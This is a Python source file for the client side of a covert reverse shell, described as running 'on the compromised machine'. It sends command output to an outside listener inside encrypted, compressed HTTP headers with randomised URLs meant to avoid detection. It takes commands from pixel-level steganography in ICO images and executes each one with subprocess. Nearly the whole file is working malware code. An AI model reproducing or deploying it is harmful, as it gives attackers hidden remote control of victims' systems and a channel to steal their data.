"""
Executes on the compromised machine. A reverse shell that communicates with the listener over HTTP.
"""

import requests
from requests import Request, Response
from copy import deepcopy
import base64
from math import ceil
from time import sleep
import os
import subprocess
import zlib
import random
import string
from Crypto.Cipher import AES
from ..utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, USER_AGENT, CLIENT_MAX_MESSAGE_LENGTH, AES_KEY, AES_IV, RequestFlags
from PIL import Image

# Time in seconds to wait for a http response before a timeout occurs.
# This time should be long, to give user ample time to input their commands into the listener. 
REQUEST_TIMEOUT = 300
# 0 is fastest but least compression, 9 is slowest but best compression.
ZLIB_COMPRESSION_LEVEL = 9 

def get_random_url():
    """
    Generates a URL pointing to the listener ip and port, but with random path and query parameters specified.
    This is meant to simulate varied web traffic (it would make sense for the client to interact with different
    pages on the website, not the same page repeatedly)
    """
    # Generate a random path
    paths = ["login", "dashboard", "profile", "settings", "checkout", "verify", "update"]
    path = random.choice(paths)

    # Random query parameters
    query_params = ["id", "user", "session", "ref", "token", "category"]
    if random.random() < 0.7:
        num_params = random.randint(1, 3)
        params = {
            random.choice(query_params): ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(3, 10)))
            for _ in range(num_params)
        }
        query_string = "?" + "&".join(f"{k}={v}" for k, v in params.items())
    else:
        query_string = ""

    return f"http://{LISTENER_IP}:{LISTENER_PORT}/{path}{query_string}"

def create_requests(data: str):
    '''
    Send 1 or more requests.

    Compresses the given string to reduce size of packets sent (reducing chance of detection). 
    Then, base64 encodes the string such that it can be stored in the HTTP header (HTTP headers don't allow some characters), and also for obfuscation purposes.
    
    todo: finish docstring

    Arguments:
        string (str): String to be compressed and encoded

    Returns:
        str: The resultant string
    '''

    def encrypt_data(data: str):
        cipher = AES.new(AES_KEY, AES.MODE_CFB, iv=AES_IV)
        return cipher.encrypt(data.encode())

    def compress_data(data: bytes):
        return zlib.compress(data, ZLIB_COMPRESSION_LEVEL)
    
    def add_request_flags(request: Request, flags: RequestFlags):
        '''
        Store request flags data in the packet
        '''
        request.headers[STEGO_HEADER_NAME] = flags.get_flags_char() + request.headers[STEGO_HEADER_NAME]
    
    # The headers for the request(s) to be sent
    requests = []
    default_request = Request(
        method='GET',
        headers= {
            STEGO_HEADER_NAME: "",
            'User-Agent': USER_AGENT,
            }
    )

    # Check if there is no data to send
    if len(data) == 0:
        requests.append(deepcopy(default_request))
        # Return a single request with empty headers
        return requests
    
    request_flags = RequestFlags(0) # Start with no flags set
    encrypted_data = encrypt_data(data)
    compressed_data = compress_data(encrypted_data)
    # If compressing makes data larger, DON'T compress the data
    if len(compressed_data) > len(encrypted_data):
        compressed_data = encrypted_data
        request_flags |= RequestFlags.IS_NOT_COMPRESSED

    encoded_str = base64.b64encode(compressed_data).decode()
    # Calculate how many requests to split the data into
    request_count = ceil(len(encoded_str) / CLIENT_MAX_MESSAGE_LENGTH)
    encoded_str_split = [encoded_str[i:i+CLIENT_MAX_MESSAGE_LENGTH] for i in range(0, len(encoded_str), CLIENT_MAX_MESSAGE_LENGTH)]
    for i in range(request_count):
        if i == (request_count - 1):
            request_flags |= RequestFlags.IS_END_OF_MESSAGE
        new_request = deepcopy(default_request)
        new_request.headers[STEGO_HEADER_NAME] = encoded_str_split[i]
        add_request_flags(new_request, request_flags)
        requests.append(new_request)
    return requests


def send_stego_data_to_listener(data: str):
    """
    Sends the given data to the listener using header steganography in a HTTP request,
    then waits for the listener's HTTP response and returns it.

    Pulls a generated url (with randomly generated web paths), and a fake domain to help with disguising amongst
    standard network traffic.

    Arguments:
        data (str): String data to send to the listener via a HTTP request. Before sending, the string is compressed and encoded.

    Returns:
        str: Reply string found within the listener's HTTP response.
    """
    # Get the list of request header(s) to send
    requests_list = create_requests(data)
    for request in requests_list:
        print(request.headers)
    # Keep retrying connection to listener until successful (ensures functioning even if temporarily disconnected)
    while (True):  
        try:
            response = None
            # Send all request(s)
            for i in range(len(requests_list)):
                request = requests_list[i]
                request.url = get_random_url()
                with requests.Session() as session:
                    response = session.send(request.prepare())
            return response
        except Exception as e:
            print(e)
            sleep(2) # Ensures connection retries aren't sent too frequently
            continue


def get_command_line_input(response: Response):
    # TODO: request image from server
    secret = "secret2.ico"
    #data = response.read()
    with open(secret, "wb") as f:
        f.write(response.content)
    # Open the ICO file and extract the first frame
    img = Image.open(secret)
    img = img.convert("RGB")  # Convert to RGB to ensure consistency
    pixels = list(img.getdata())
    binary_text = ""
    
    # Extract LSBs from the pixel data
    for pixel in pixels:
        r, g, b = pixel
        binary_text += str(r & 1)  # Extract LSB of Red
        binary_text += str(g & 1)  # Extract LSB of Green
        binary_text += str(b & 1)  # Extract LSB of Blue
    
    # Check for end marker
    if "1111111111111110" in binary_text:
        binary_text = binary_text[:binary_text.index("1111111111111110")]
    
    # Split binary text into 8-bit chunks
    chars = [binary_text[i:i+8] for i in range(0, len(binary_text), 8)]
    decoded_text = ""
    for char in chars:
        try:
            decoded_text += chr(int(char, 2))
        except ValueError:
            continue  # Skip invalid characters
    
    return decoded_text
    #return response.text


def execute_command_line_input(input: str):
    """
    Executes the given input as command-line input on the system, returns output.
    This is used for the reverse shell.

    Arguments:
        input (str): Command-line input to be executed on the system (e.g. 'ls -la')

    Returns:
        str: The command-line output from executing the input
    """
    if (input == ""):
        return ""
    split_input = input.split()
    if split_input[0].lower() == "cd":
        # Need to handle 'cd' manually, cannot use `subprocess` library
        try:
            # Change directory
            os.chdir(' '.join(split_input[1:]))
            output = os.getcwd()
        except FileNotFoundError as e:
            output = str(e)
    else:
        # Execute the command and retrieve the output (might be an error message if command couldn't execute)
        output = subprocess.getoutput(input)
        #  TODO: allow long-running processes
        # subprocess.run(args=input, stdout=None, stderr=None, capture_output=True)
    return output


def main():
    # First message to listener contains the current working directory.
    command_line_output = os.getcwd()
    while True:
        '''
        1. Client sends command-line output to listener (http request)
        2. Listener sends command-line input to client (http response)
        3. repeat
        '''
        last_response = send_stego_data_to_listener(command_line_output)
        command_line_input = get_command_line_input(last_response)
        command_line_output = execute_command_line_input(command_line_input)


if __name__ == '__main__':
    main()
